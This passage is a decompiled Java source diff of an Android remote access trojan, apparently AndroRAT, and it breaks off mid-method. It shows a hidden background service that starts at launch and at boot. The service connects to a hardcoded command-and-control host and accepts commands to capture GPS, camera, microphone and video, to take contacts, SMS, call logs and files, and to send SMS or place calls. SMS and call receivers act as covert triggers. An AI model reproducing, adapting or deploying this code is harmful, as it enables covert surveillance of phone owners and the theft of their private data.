@@ -1,0 +1,4498 @@
+package in;
+public class Demux {
+    private java.nio.ByteBuffer buffer;
+    private inout.Controler controler;
+    private String imei;
+    private Packet.TransportPacket p;
+    private boolean partialDataExpected;
+    private boolean reading;
+
+    public Demux(inout.Controler p2, String p3)
+    {
+        this.imei = p3;
+        this.controler = p2;
+        this.reading = 1;
+        this.partialDataExpected = 0;
+        return;
+    }
+
+    public boolean receive(java.nio.ByteBuffer p5)
+    {
+        while (this.reading) {
+            if ((this.partialDataExpected) || ((p5.limit() - p5.position()) >= 15)) {
+                if (!this.partialDataExpected) {
+                    this.p = new Packet.TransportPacket();
+                    this.partialDataExpected = this.p.parse(p5);
+                } else {
+                    this.partialDataExpected = this.p.parseCompleter(p5);
+                }
+                if (!this.partialDataExpected) {
+                    this.controler.Storage(this.p, this.imei);
+                }
+            }
+            return 1;
+        }
+        this.reading = 1;
+        return 1;
+    }
+
+    public void setImei(String p1)
+    {
+        this.imei = p1;
+        return;
+    }
+}
+package in;
+public class Receiver {
+    private java.nio.ByteBuffer buffer;
+    private java.io.InputStream is;
+    private byte[] received_data;
+    private java.net.Socket socket;
+
+    public Receiver(java.net.Socket p3)
+    {
+        this.socket = p3;
+        this.is = this.socket.getInputStream();
+        java.nio.ByteBuffer v0_3 = new byte[2048];
+        this.received_data = v0_3;
+        this.buffer = java.nio.ByteBuffer.allocate(2048);
+        return;
+    }
+
+    public java.nio.ByteBuffer read()
+    {
+        int v0 = this.is.read(this.received_data);
+        this.buffer.clear();
+        this.buffer = java.nio.ByteBuffer.wrap(this.received_data, 0, v0);
+        return this.buffer;
+    }
+
+    public java.nio.ByteBuffer read(java.nio.ByteBuffer p8)
+    {
+        if ((p8.position() <= 0) || (p8.position() >= 15)) {
+            int v0_0 = this.is.read(this.received_data);
+        } else {
+            byte[] v1_0 = new byte[p8.position()];
+            p8.flip();
+            p8.get(v1_0, 0, p8.limit());
+            System.arraycopy(v1_0, 0, this.received_data, 0, v1_0.length);
+            v0_0 = (this.is.read(this.received_data, v1_0.length, (2048 - v1_0.length)) + v1_0.length);
+        }
+        this.buffer = java.nio.ByteBuffer.wrap(this.received_data, 0, v0_0);
+        return this.buffer;
+    }
+}
+package inout;
+public interface Controler {
+
+    public abstract void Storage();
+}
+package inout;
+public class Protocol {
+    public static final short ACK_GIVE_CALL = 0;
+    public static final short ACK_SEND_SMS = 0;
+    public static final short ACK_TOAST = 0;
+    public static final int ALL_DONE = 3;
+    public static final int ARG_STREAM_AUDIO_DOWN_CALL = 3;
+    public static final int ARG_STREAM_AUDIO_MIC = 1;
+    public static final int ARG_STREAM_AUDIO_UPDOWN_CALL = 4;
+    public static final int ARG_STREAM_AUDIO_UP_CALL = 2;
+    public static final short CONNECT = 2;
+    public static final short DATA_BASIC_INFO = 0;
+    public static final short DATA_CALL_LOGS = 0;
+    public static final short DATA_CONTACTS = 0;
+    public static final short DATA_FILE = 0;
+    public static final short DATA_GPS = 0;
+    public static final short DATA_GPS_STREAM = 0;
+    public static final short DATA_LIST_DIR = 0;
+    public static final short DATA_MONITOR_CALL = 0;
+    public static final short DATA_MONITOR_SMS = 0;
+    public static final short DATA_PICTURE = 0;
+    public static final short DATA_SMS = 0;
+    public static final short DATA_SOUND_STREAM = 0;
+    public static final short DATA_VIDEO_STREAM = 0;
+    public static final short DEBUG = 0;
+    public static final short DISCONNECT = 5;
+    public static final short DO_TOAST = 0;
+    public static final short DO_VIBRATE = 0;
+    public static final short ENVOI_CMD = 3;
+    public static final short ERROR = 1;
+    public static final short GET_ADV_INFORMATIONS = 0;
+    public static final short GET_BASIC_INFO = 0;
+    public static final short GET_CALL_LOGS = 0;
+    public static final short GET_CONTACTS = 0;
+    public static final short GET_FILE = 0;
+    public static final short GET_GPS = 0;
+    public static final short GET_GPS_STREAM = 0;
+    public static final short GET_PICTURE = 0;
+    public static final short GET_PREFERENCE = 21;
+    public static final short GET_SMS = 0;
+    public static final short GET_SOUND_STREAM = 0;
+    public static final short GET_VIDEO_STREAM = 0;
+    public static final short GIVE_CALL = 0;
+    public static final int HEADER_LENGTH_DATA = 15;
+    public static final short INFOS = 4;
+    public static final String KEY_SEND_SMS_BODY = "body";
+    public static final String KEY_SEND_SMS_NUMBER = "number";
+    public static final short LIST_DIR = 0;
+    public static final int MAX_PACKET_SIZE = 2048;
+    public static final short MONITOR_CALL = 0;
+    public static final short MONITOR_SMS = 0;
+    public static final int NO_MORE = 1;
+    public static final short OPEN_BROWSER = 0;
+    public static final int PACKET_DONE = 4;
+    public static final int PACKET_LOST = 0;
+    private static short P_INST = 0;
+    private static short P_REP = 0;
+    public static final short SEND_SMS = 0;
+    public static final short SET_PREFERENCE = 20;
+    public static final int SIZE_ERROR = 2;
+    public static final short STOP_GPS_STREAM;
+    public static final short STOP_MONITOR_CALL;
+    public static final short STOP_MONITOR_SMS;
+    public static final short STOP_SOUND_STREAM;
+    public static final short STOP_VIDEO_STREAM;
+
+    static Protocol()
+    {
+        inout.Protocol.P_INST = 100;
+        inout.Protocol.GET_GPS = ((short) (inout.Protocol.P_INST + 0));
+        inout.Protocol.GET_GPS_STREAM = ((short) (inout.Protocol.P_INST + 1));
+        inout.Protocol.STOP_GPS_STREAM = ((short) (inout.Protocol.P_INST + 2));
+        inout.Protocol.GET_PICTURE = ((short) (inout.Protocol.P_INST + 3));
+        inout.Protocol.GET_SOUND_STREAM = ((short) (inout.Protocol.P_INST + 4));
+        inout.Protocol.STOP_SOUND_STREAM = ((short) (inout.Protocol.P_INST + 5));
+        inout.Protocol.GET_VIDEO_STREAM = ((short) (inout.Protocol.P_INST + 6));
+        inout.Protocol.STOP_VIDEO_STREAM = ((short) (inout.Protocol.P_INST + 7));
+        inout.Protocol.GET_BASIC_INFO = ((short) (inout.Protocol.P_INST + 8));
+        inout.Protocol.DO_TOAST = ((short) (inout.Protocol.P_INST + 9));
+        inout.Protocol.MONITOR_SMS = ((short) (inout.Protocol.P_INST + 10));
+        inout.Protocol.MONITOR_CALL = ((short) (inout.Protocol.P_INST + 11));
+        inout.Protocol.GET_CONTACTS = ((short) (inout.Protocol.P_INST + 12));
+        inout.Protocol.GET_SMS = ((short) (inout.Protocol.P_INST + 13));
+        inout.Protocol.LIST_DIR = ((short) (inout.Protocol.P_INST + 14));
+        inout.Protocol.GET_FILE = ((short) (inout.Protocol.P_INST + 15));
+        inout.Protocol.GIVE_CALL = ((short) (inout.Protocol.P_INST + 16));
+        inout.Protocol.SEND_SMS = ((short) (inout.Protocol.P_INST + 17));
+        inout.Protocol.GET_CALL_LOGS = ((short) (inout.Protocol.P_INST + 18));
+        inout.Protocol.STOP_MONITOR_SMS = ((short) (inout.Protocol.P_INST + 19));
+        inout.Protocol.STOP_MONITOR_CALL = ((short) (inout.Protocol.P_INST + 20));
+        inout.Protocol.GET_ADV_INFORMATIONS = ((short) (inout.Protocol.P_INST + 21));
+        inout.Protocol.OPEN_BROWSER = ((short) (inout.Protocol.P_INST + 22));
+        inout.Protocol.DO_VIBRATE = ((short) (inout.Protocol.P_INST + 23));
+        inout.Protocol.P_REP = 200;
+        inout.Protocol.DATA_GPS = ((short) (inout.Protocol.P_REP + 0));
+        inout.Protocol.DATA_GPS_STREAM = ((short) (inout.Protocol.P_REP + 1));
+        inout.Protocol.DATA_PICTURE = ((short) (inout.Protocol.P_REP + 2));
+        inout.Protocol.DATA_SOUND_STREAM = ((short) (inout.Protocol.P_REP + 3));
+        inout.Protocol.DATA_VIDEO_STREAM = ((short) (inout.Protocol.P_REP + 4));
+        inout.Protocol.DATA_BASIC_INFO = ((short) (inout.Protocol.P_REP + 5));
+        inout.Protocol.ACK_TOAST = ((short) (inout.Protocol.P_REP + 6));
+        inout.Protocol.DATA_MONITOR_SMS = ((short) (inout.Protocol.P_REP + 7));
+        inout.Protocol.DATA_MONITOR_CALL = ((short) (inout.Protocol.P_REP + 8));
+        inout.Protocol.DATA_CONTACTS = ((short) (inout.Protocol.P_REP + 9));
+        inout.Protocol.DATA_SMS = ((short) (inout.Protocol.P_REP + 10));
+        inout.Protocol.DATA_LIST_DIR = ((short) (inout.Protocol.P_REP + 11));
+        inout.Protocol.DATA_FILE = ((short) (inout.Protocol.P_REP + 12));
+        inout.Protocol.ACK_GIVE_CALL = ((short) (inout.Protocol.P_REP + 13));
+        inout.Protocol.ACK_SEND_SMS = ((short) (inout.Protocol.P_REP + 14));
+        inout.Protocol.DATA_CALL_LOGS = ((short) (inout.Protocol.P_REP + 15));
+        return;
+    }
+
+    public Protocol()
+    {
+        return;
+    }
+
+    public static byte[] dataHeaderGenerator(int p10, int p11, boolean p12, short p13, int p14)
+    {
+        byte[] v4 = java.nio.ByteBuffer.allocate(4).putInt(p10).array();
+        byte[] v1 = java.nio.ByteBuffer.allocate(4).putInt(p11).array();
+        byte[] v2 = new byte[1];
+        if (!p12) {
+            v2[0] = 0;
+        } else {
+            v2[0] = 1;
+        }
+        byte[] v3 = java.nio.ByteBuffer.allocate(2).putShort(p13).array();
+        byte[] v0 = java.nio.ByteBuffer.allocate(4).putInt(p14).array();
+        byte[] v5 = new byte[15];
+        System.arraycopy(v4, 0, v5, 0, v4.length);
+        System.arraycopy(v1, 0, v5, v4.length, v1.length);
+        System.arraycopy(v2, 0, v5, (v4.length + v1.length), v2.length);
+        System.arraycopy(v3, 0, v5, ((v4.length + v1.length) + v2.length), v3.length);
+        System.arraycopy(v0, 0, v5, (((v4.length + v1.length) + v2.length) + v3.length), v0.length);
+        return v5;
+    }
+}
+package my.app.client;
+public class AlarmListener extends android.content.BroadcastReceiver {
+    public final String TAG;
+
+    public AlarmListener()
+    {
+        this.TAG = my.app.client.AlarmListener.getSimpleName();
+        return;
+    }
+
+    public void onReceive(android.content.Context p8, android.content.Intent p9)
+    {
+        android.util.Log.d(this.TAG, "Alarm received !");
+        try {
+            String v2 = p9.getExtras().getString("alarm_message");
+        } catch (Exception v1) {
+            android.util.Log.e(this.TAG, new StringBuilder("Error in Alarm received !").append(v1.getMessage()).toString());
+            return;
+        }
+        if (v2 == null) {
+            return;
+        } else {
+            android.util.Log.i(this.TAG, new StringBuilder("Message received: ").append(v2).toString());
+            android.content.Intent v3_1 = new android.content.Intent(p8, my.app.client.Client);
+            v3_1.setAction(my.app.client.AlarmListener.getSimpleName());
+            p8.startService(v3_1);
+            return;
+        }
+    }
+}
+package my.app.client;
+public class AndroratActivity extends android.app.Activity {
+
+    public AndroratActivity()
+    {
+        return;
+    }
+
+    public void onCreate(android.os.Bundle p2)
+    {
+        super.onCreate(p2);
+        this.setContentView(2130903040);
+        return;
+    }
+}
+package my.app.client;
+public class BootReceiver extends android.content.BroadcastReceiver {
+    public final String TAG;
+
+    public BootReceiver()
+    {
+        this.TAG = my.app.client.BootReceiver.getSimpleName();
+        return;
+    }
+
+    public void onReceive(android.content.Context p5, android.content.Intent p6)
+    {
+        android.util.Log.i(this.TAG, "BOOT Complete received by Client !");
+        if (p6.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
+            android.content.Intent v1_0 = new android.content.Intent(p5, my.app.client.Client);
+            v1_0.setAction(my.app.client.BootReceiver.getSimpleName());
+            p5.startService(v1_0);
+        }
+        return;
+    }
+}
+package my.app.client;
+public final class BuildConfig {
+    public static final boolean DEBUG = True;
+
+    public BuildConfig()
+    {
+        return;
+    }
+}
+package my.app.client;
+ class Client$1 extends android.os.Handler {
+    final synthetic my.app.client.Client this$0;
+
+    Client$1(my.app.client.Client p1)
+    {
+        this.this$0 = p1;
+        return;
+    }
+
+    public void handleMessage(android.os.Message p3)
+    {
+        this.this$0.processCommand(p3.getData());
+        return;
+    }
+}
+package my.app.client;
+ class Client$2 implements java.lang.Runnable {
+    final synthetic my.app.client.Client this$0;
+
+    Client$2(my.app.client.Client p1)
+    {
+        this.this$0 = p1;
+        return;
+    }
+
+    public void run()
+    {
+        this.this$0.waitInstruction();
+        return;
+    }
+}
+package my.app.client;
+ class Client$3 implements java.lang.Runnable {
+    final synthetic my.app.client.Client this$0;
+
+    Client$3(my.app.client.Client p1)
+    {
+        this.this$0 = p1;
+        return;
+    }
+
+    public void run()
+    {
+        this.this$0.waitInstruction();
+        return;
+    }
+}
+package my.app.client;
+public abstract class ClientListener extends android.app.Service implements android.media.AudioRecord$OnRecordPositionUpdateListener, android.location.LocationListener {
+    protected android.content.BroadcastReceiver Callreceiver;
+    public final android.content.BroadcastReceiver ConnectivityCheckReceiver;
+    protected android.content.BroadcastReceiver SMSreceiver;
+    public my.app.Library.AdvancedSystemInfo advancedInfos;
+    public my.app.Library.AudioStreamer audioStreamer;
+    java.util.ArrayList authorizedNumbersCall;
+    java.util.ArrayList authorizedNumbersKeywords;
+    java.util.ArrayList authorizedNumbersSMS;
+    public my.app.Library.CallLogLister callLogLister;
+    public my.app.Library.CallMonitor callMonitor;
+    public my.app.Library.DirLister dirLister;
+    public my.app.Library.FileDownloader fileDownloader;
+    public my.app.Library.GPSListener gps;
+    public my.app.Library.SystemInfo infos;
+    String ip;
+    protected boolean isConnected;
+    public my.app.Library.PhotoTaker photoTaker;
+    int port;
+    public my.app.Library.SMSMonitor smsMonitor;
+    public android.widget.Toast toast;
+    boolean waitTrigger;
+
+    public ClientListener()
+    {
+        this.isConnected = 1;
+        this.SMSreceiver = new my.app.client.ClientListener$1(this);
+        this.Callreceiver = new my.app.client.ClientListener$2(this);
+        this.ConnectivityCheckReceiver = new my.app.client.ClientListener$3(this);
+        return;
+    }
+
+    public abstract void handleData();
+
+    public abstract void loadPreferences();
+
+    public android.os.IBinder onBind(android.content.Intent p2)
+    {
+        return 0;
+    }
+
+    public void onLocationChanged(android.location.Location p3)
+    {
+        this.handleData(this.gps.getChannel(), this.gps.encode(p3));
+        return;
+    }
+
+    public void onMarkerReached(android.media.AudioRecord p2)
+    {
+        this.sendError("Marker reached for audio streaming");
+        return;
+    }
+
+    public void onPeriodicNotification(android.media.AudioRecord p3)
+    {
+        try {
+            byte[] v0 = this.audioStreamer.getData();
+        } catch (int v1) {
+            return;
+        }
+        if (v0 == null) {
+            return;
+        } else {
+            this.handleData(this.audioStreamer.getChannel(), v0);
+            return;
+        }
+    }
+
+    public void onProviderDisabled(String p2)
+    {
+        this.sendError("GPS desactivated");
+        return;
+    }
+
+    public void onProviderEnabled(String p2)
+    {
+        this.sendInformation("GPS Activated");
+        return;
+    }
+
+    public void onStatusChanged(String p1, int p2, android.os.Bundle p3)
+    {
+        return;
+    }
+
+    public abstract void sendError();
+
+    public abstract void sendInformation();
+}
+package my.app.client;
+public class Client extends my.app.client.ClientListener implements inout.Controler {
+    public final String TAG;
+    byte[] cmd;
+    out.Connection conn;
+    int elapsedTime;
+    private android.os.Handler handler;
+    boolean isListening;
+    boolean isRunning;
+    int nbAttempts;
+    Packet.CommandPacket packet;
+    my.app.client.ProcessCommand procCmd;
+    Thread readthread;
+    boolean stop;
+
+    public Client()
+    {
+        this.TAG = my.app.client.Client.getSimpleName();
+        this.nbAttempts = 10;
+        this.elapsedTime = 1;
+        this.stop = 0;
+        this.isRunning = 0;
+        this.isListening = 0;
+        this.handler = new my.app.client.Client$1(this);
+        return;
+    }
+
+    public void Storage(Packet.TransportPacket p6, String p7)
+    {
+        try {
+            this.packet = new Packet.CommandPacket();
+            this.packet.parse(p6.getData());
+            android.os.Message v2_1 = new android.os.Message();
+            android.os.Bundle v0_0 = new android.os.Bundle();
+            v0_0.putShort("command", this.packet.getCommand());
+            v0_0.putByteArray("arguments", this.packet.getArguments());
+            v0_0.putInt("chan", this.packet.getTargetChannel());
+            v2_1.setData(v0_0);
+            this.handler.sendMessage(v2_1);
+        } catch (Exception v1) {
+            System.out.println("Androrat.Client.storage : pas une commande");
+        }
+        return;
+    }
+
+    public void handleData(int p2, byte[] p3)
+    {
+        this.conn.sendData(p2, p3);
+        return;
+    }
+
+    public void loadPreferences()
+    {
+        Packet.PreferencePacket v0 = this.procCmd.loadPreferences();
+        this.waitTrigger = v0.isWaitTrigger();
+        this.ip = v0.getIp();
+        this.port = v0.getPort();
+        this.authorizedNumbersCall = v0.getPhoneNumberCall();
+        this.authorizedNumbersSMS = v0.getPhoneNumberSMS();
+        this.authorizedNumbersKeywords = v0.getKeywordSMS();
+        return;
+    }
+
+    public void onCreate()
+    {
+        android.util.Log.i(this.TAG, "In onCreate");
+        this.infos = new my.app.Library.SystemInfo(this);
+        this.procCmd = new my.app.client.ProcessCommand(this);
+        this.loadPreferences();
+        return;
+    }
+
+    public void onDestroy()
+    {
+        android.util.Log.i(this.TAG, "in onDestroy");
+        this.unregisterReceiver(this.ConnectivityCheckReceiver);
+        this.conn.stop();
+        this.stop = 1;
+        this.stopSelf();
+        super.onDestroy();
+        return;
+    }
+
+    public int onStartCommand(android.content.Intent p10, int p11, int p12)
+    {
+        if (p10 != null) {
+            String v2 = p10.getAction();
+            android.util.Log.i(this.TAG, new StringBuilder("onStartCommand by: ").append(v2).toString());
+            if (p10.hasExtra("IP")) {
+                this.ip = p10.getExtras().getString("IP");
+            }
+            if (p10.hasExtra("PORT")) {
+                this.port = p10.getExtras().getInt("PORT");
+            }
+            if (this.isRunning) {
+                if (!this.isListening) {
+                    android.util.Log.i(this.TAG, new StringBuilder("Connection by : ").append(v2).toString());
+                    if (!this.conn.connect()) {
+                        this.reconnectionAttempts();
+                    } else {
+                        this.readthread = new Thread(new my.app.client.Client$3(this));
+                        this.readthread.start();
+                        this.handleData(0, new Packet.CommandPacket(2, 0, this.infos.getBasicInfos()).build());
+                        this.isListening = 1;
+                        if (this.waitTrigger) {
+                            this.unregisterReceiver(this.SMSreceiver);
+                            this.unregisterReceiver(this.Callreceiver);
+                            this.waitTrigger = 0;
+                        }
+                    }
+                } else {
+                    android.util.Log.w(this.TAG, new StringBuilder("Called uselessly by: ").append(v2).append(" (already listening)").toString());
+                }
+            } else {
+                this.registerReceiver(this.ConnectivityCheckReceiver, new android.content.IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"));
+                this.isRunning = 1;
+                this.conn = new out.Connection(this.ip, this.port, this);
+                if (!this.waitTrigger) {
+                    android.util.Log.i(this.TAG, new StringBuilder("Try to connect to ").append(this.ip).append(":").append(this.port).toString());
+                    if (!this.conn.connect()) {
+                        if (!this.isConnected) {
+                            android.util.Log.w(this.TAG, "Not Connected wait a Network update");
+                        } else {
+                            this.resetConnectionAttempts();
+                            this.reconnectionAttempts();
+                        }
+                    } else {
+                        this.packet = new Packet.CommandPacket();
+                        this.readthread = new Thread(new my.app.client.Client$2(this));
+                        this.readthread.start();
+                        this.handleData(0, new Packet.CommandPacket(2, 0, this.infos.getBasicInfos()).build());
+                        this.isListening = 1;
+                        if (this.waitTrigger) {
+                            this.unregisterReceiver(this.SMSreceiver);
+                            this.unregisterReceiver(this.Callreceiver);
+                            this.waitTrigger = 0;
+                        }
+                    }
+                } else {
+                    this.registerSMSAndCall();
+                }
+            }
+        }
+        return 1;
+    }
+
+    public void processCommand(android.os.Bundle p6)
+    {
+        try {
+            this.procCmd.process(p6.getShort("command"), p6.getByteArray("arguments"), p6.getInt("chan"));
+        } catch (Exception v0) {
+            this.sendError(new StringBuilder("Error on Client:").append(v0.getMessage()).toString());
+        }
+        return;
+    }
+
+    public void reconnectionAttempts()
+    {
+        if (this.isConnected) {
+            if (this.nbAttempts == 0) {
+                switch (this.elapsedTime) {
+                    case 1:
+                        this.elapsedTime = 5;
+                        break;
+                    case 5:
+                        this.elapsedTime = 10;
+                        break;
+                    case 10:
+                        this.elapsedTime = 30;
+                        break;
+                    case 30:
+                        break;
+                    default:
+                }
+                return;
+            }
+            java.util.Calendar v1 = java.util.Calendar.getInstance();
+            v1.add(12, this.elapsedTime);
+            android.content.Intent v2_1 = new android.content.Intent(this, my.app.client.AlarmListener);
+            v2_1.putExtra("alarm_message", "Wake up Dude !");
+            ((android.app.AlarmManager) this.getSystemService("alarm")).set(0, v1.getTimeInMillis(), android.app.PendingIntent.getBroadcast(this, 0, v2_1, 134217728));
+            this.nbAttempts = (this.nbAttempts - 1);
+        }
+        return;
+    }
+
+    public void registerSMSAndCall()
+    {
+        android.content.IntentFilter v0_1 = new android.content.IntentFilter();
+        v0_1.addAction("android.provider.Telephony.SMS_RECEIVED");
+        this.registerReceiver(this.SMSreceiver, v0_1);
+        android.content.IntentFilter v1_1 = new android.content.IntentFilter();
+        v1_1.addAction("android.intent.action.PHONE_STATE");
+        this.registerReceiver(this.Callreceiver, v1_1);
+        return;
+    }
+
+    public void resetConnectionAttempts()
+    {
+        this.nbAttempts = 10;
+        this.elapsedTime = 1;
+        return;
+    }
+
+    public void sendError(String p6)
+    {
+        this.conn.sendData(1, new Packet.LogPacket(System.currentTimeMillis(), 1, p6).build());
+        return;
+    }
+
+    public void sendInformation(String p7)
+    {
+        this.conn.sendData(1, new Packet.LogPacket(System.currentTimeMillis(), 0, p7).build());
+        return;
+    }
+
+    public void waitInstruction()
+    {
+        try {
+            while (this.stop) {
+                return;
+            }
+        } catch (Exception v0) {
+            this.isListening = 0;
+            this.resetConnectionAttempts();
+            this.reconnectionAttempts();
+            if (!this.waitTrigger) {
+                return;
+            } else {
+                this.registerSMSAndCall();
+                return;
+            }
+        }
+        this.conn.getInstruction();
+    }
+}
+package my.app.client;
+ class ClientListener$1 extends android.content.BroadcastReceiver {
+    private final String SMS_RECEIVED;
+    final synthetic my.app.client.ClientListener this$0;
+
+    ClientListener$1(my.app.client.ClientListener p2)
+    {
+        this.this$0 = p2;
+        this.SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
+        return;
+    }
+
+    public void onReceive(android.content.Context p14, android.content.Intent p15)
+    {
+        if (p15.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+            android.util.Log.i("SMSReceived", "onReceive sms !");
+            android.os.Bundle v0 = p15.getExtras();
+            if (v0 != null) {
+                Object[] v6_1 = ((Object[]) v0.get("pdus"));
+                android.telephony.SmsMessage[] v5 = new android.telephony.SmsMessage[v6_1.length];
+                int v3 = 0;
+                while (v3 < v6_1.length) {
+                    v5[v3] = android.telephony.SmsMessage.createFromPdu(((byte[]) v6_1[v3]));
+                    v3++;
+                }
+                if (v5.length > -1) {
+                    String v4 = v5[0].getMessageBody();
+                    String v7 = v5[0].getDisplayOriginatingAddress();
+                    if (this.this$0.authorizedNumbersCall != null) {
+                        int v1 = 0;
+                        int v2 = 0;
+                        String v10_14 = this.this$0.authorizedNumbersSMS.iterator();
+                        while (v10_14.hasNext()) {
+                            if (((String) v10_14.next()).equals(v7)) {
+                                v1 = 1;
+                            }
+                        }
+                        if (v1 != 0) {
+                            if (this.this$0.authorizedNumbersKeywords != null) {
+                                String v10_20 = this.this$0.authorizedNumbersKeywords.iterator();
+                                while (v10_20.hasNext()) {
+                                    if (v4.contains(((String) v10_20.next()))) {
+                                        v2 = 1;
+                                    }
+                                }
+                                if (v2 == 0) {
+                                    return;
+                                }
+                            }
+                            android.util.Log.i("Client", "Incoming call authorized");
+                        }
+                    }
+                    android.content.Intent v9_1 = new android.content.Intent(p14, my.app.client.Client);
+                    v9_1.setAction("SMSReceiver");
+                    p14.startService(v9_1);
+                }
+            }
+        }
+        return;
+    }
+}
+package my.app.client;
+ class ClientListener$2 extends android.content.BroadcastReceiver {
+    private static final String TAG = "CallReceiver";
+    final synthetic my.app.client.ClientListener this$0;
+
+    ClientListener$2(my.app.client.ClientListener p1)
+    {
+        this.this$0 = p1;
+        return;
+    }
+
+    public void onReceive(android.content.Context p11, android.content.Intent p12)
+    {
+        android.util.Log.i("CallReceiver", "Call state changed !");
+        String v0 = p12.getAction();
+        if (!v0.equals("android.intent.action.PHONE_STATE")) {
+            android.util.Log.i("CallReceiver", new StringBuilder("broadcast : action=").append(v0).append(", data=").append(p12.getDataString()).toString());
+        } else {
+            String v4 = p12.getStringExtra("state");
+            String v3 = p12.getStringExtra("incoming_number");
+            if (v4.equals(android.telephony.TelephonyManager.EXTRA_STATE_RINGING)) {
+                android.util.Log.i("CallReceiver", "Incoming call");
+                if (this.this$0.authorizedNumbersCall != null) {
+                    int v2 = 0;
+                    String v7_11 = this.this$0.authorizedNumbersCall.iterator();
+                    while (v7_11.hasNext()) {
+                        if (((String) v7_11.next()).equals(v3)) {
+                            v2 = 1;
+                        }
+                    }
+                    if (v2 != 0) {
+                        android.util.Log.i("CallReceiver", "Incoming call authorized");
+                    } else {
+                        return;
+                    }
+                }
+                android.content.Intent v6_1 = new android.content.Intent(p11, my.app.client.Client);
+                v6_1.setAction("CallReceiver");
+                p11.startService(v6_1);
+            }
+        }
+        return;
+    }
+}
+package my.app.client;
+ class ClientListener$3 extends android.content.BroadcastReceiver {
+    private String TAG;
+    final synthetic my.app.client.ClientListener this$0;
+
+    ClientListener$3(my.app.client.ClientListener p2)
+    {
+        this.this$0 = p2;
+        this.TAG = "ConnectivityReceiver";
+        return;
+    }
+
+    public void onReceive(android.content.Context p11, android.content.Intent p12)
+    {
+        int v5;
+        p12.getAction();
+        if (((android.net.ConnectivityManager) p11.getSystemService("connectivity")).getActiveNetworkInfo() != null) {
+            v5 = 1;
+        } else {
+            v5 = 0;
+        }
+        String v6;
+        android.net.NetworkInfo v3_1 = ((android.net.NetworkInfo) p12.getParcelableExtra("networkInfo"));
+        if (v3_1.getType() != 1) {
+            if (v3_1.getType() != 0) {
+                v6 = "other";
+            } else {
+                v6 = "3g";
+            }
+        } else {
+            v6 = "Wifi";
+        }
+        if (v5 == 0) {
+            android.util.Log.w(this.TAG, new StringBuilder("Connection is not Available ").append(v6).toString());
+        } else {
+            android.util.Log.w(this.TAG, new StringBuilder("Connection is Available ").append(v6).toString());
+            if (!this.this$0.isConnected) {
+                android.content.Intent v4_1 = new android.content.Intent(p11, my.app.client.Client);
+                v4_1.setAction("ConnectivityCheckReceiver");
+                p11.startService(v4_1);
+            }
+        }
+        this.this$0.isConnected = v5;
+        return;
+    }
+}
+package my.app.client;
+public class LauncherActivity extends android.app.Activity {
+    android.content.Intent Client;
+    android.content.Intent ClientAlt;
+    android.widget.Button btnStart;
+    android.widget.Button btnStop;
+    android.widget.EditText ipfield;
+    String myIp;
+    int myPort;
+    android.widget.EditText portfield;
+
+    public LauncherActivity()
+    {
+        this.myIp = "kharboshy.no-ip.org";
+        this.myPort = 9999;
+        return;
+    }
+
+    public void onCreate(android.os.Bundle p4)
+    {
+        super.onCreate(p4);
+        this.setContentView(2130903040);
+        this.Client = new android.content.Intent(this, my.app.client.Client);
+        this.Client.setAction(my.app.client.LauncherActivity.getName());
+        this.btnStart = ((android.widget.Button) this.findViewById(2131099650));
+        this.btnStop = ((android.widget.Button) this.findViewById(2131099651));
+        this.ipfield = ((android.widget.EditText) this.findViewById(2131099648));
+        this.portfield = ((android.widget.EditText) this.findViewById(2131099649));
+        if (this.myIp != "") {
+            this.ipfield.setText(this.myIp);
+            this.portfield.setText(String.valueOf(this.myPort));
+            this.Client.putExtra("IP", this.myIp);
+            this.Client.putExtra("PORT", this.myPort);
+        } else {
+            this.ipfield.setText("kharboshy.no-ip.org");
+            this.portfield.setText("9999");
+            this.Client.putExtra("IP", this.ipfield.getText().toString());
+            this.Client.putExtra("PORT", Integer.parseInt(this.portfield.getText().toString()));
+        }
+        this.startService(this.Client);
+        this.btnStart.setEnabled(0);
+        this.btnStop.setEnabled(1);
+        return;
+    }
+
+    public void onResume()
+    {
+        super.onResume();
+        this.setContentView(2130903040);
+        this.Client = new android.content.Intent(this, my.app.client.Client);
+        this.Client.setAction(my.app.client.LauncherActivity.getName());
+        this.btnStart = ((android.widget.Button) this.findViewById(2131099650));
+        this.btnStop = ((android.widget.Button) this.findViewById(2131099651));
+        this.ipfield = ((android.widget.EditText) this.findViewById(2131099648));
+        this.portfield = ((android.widget.EditText) this.findViewById(2131099649));
+        if (this.myIp != "") {
+            this.ipfield.setText(this.myIp);
+            this.portfield.setText(String.valueOf(this.myPort));
+            this.Client.putExtra("IP", this.myIp);
+            this.Client.putExtra("PORT", this.myPort);
+        } else {
+            this.ipfield.setText("kharboshy.no-ip.org");
+            this.portfield.setText("9999");
+            this.Client.putExtra("IP", this.ipfield.getText().toString());
+            this.Client.putExtra("PORT", Integer.parseInt(this.portfield.getText().toString()));
+        }
+        this.startService(this.Client);
+        this.btnStart.setEnabled(0);
+        this.btnStop.setEnabled(1);
+        return;
+    }
+
+    public void onStart()
+    {
+        super.onStart();
+        this.onResume();
+        return;
+    }
+}
+package my.app.client;
+public class Preference extends android.preference.PreferenceActivity {
+
+    public Preference()
+    {
+        return;
+    }
+
+    public void onCreate(android.os.Bundle p2)
+    {
+        super.onCreate(p2);
+        this.addPreferencesFromResource(2130968576);
+        return;
+    }
+}
+package my.app.client;
+public class ProcessCommand {
+    java.nio.ByteBuffer arguments;
+    int chan;
+    my.app.client.ClientListener client;
+    short commande;
+    android.content.SharedPreferences$Editor editor;
+    android.content.Intent intent;
+    android.content.SharedPreferences settings;
+
+    public ProcessCommand(my.app.client.ClientListener p4)
+    {
+        this.client = p4;
+        this.settings = this.client.getSharedPreferences("preferences.xml", 0);
+        this.editor = this.settings.edit();
+        return;
+    }
+
+    private java.util.ArrayList MessageDecoupator(String p5)
+    {
+        java.util.ArrayList v0_1 = new java.util.ArrayList();
+        int v1 = 0;
+        while (v1 < p5.length()) {
+            if ((v1 - p5.length()) >= 167) {
+                v0_1.add(p5.substring(v1, (v1 + 167)));
+            } else {
+                v0_1.add(p5.substring(v1, p5.length()));
+            }
+            v1 += 167;
+        }
+        return v0_1;
+    }
+
+    private void savePreferences(byte[] p14)
+    {
+        Packet.PreferencePacket v4_1 = new Packet.PreferencePacket();
+        v4_1.parse(p14);
+        android.content.SharedPreferences$Editor v0 = this.client.getSharedPreferences("preferences", 0).edit();
+        v0.putString("ip", v4_1.getIp());
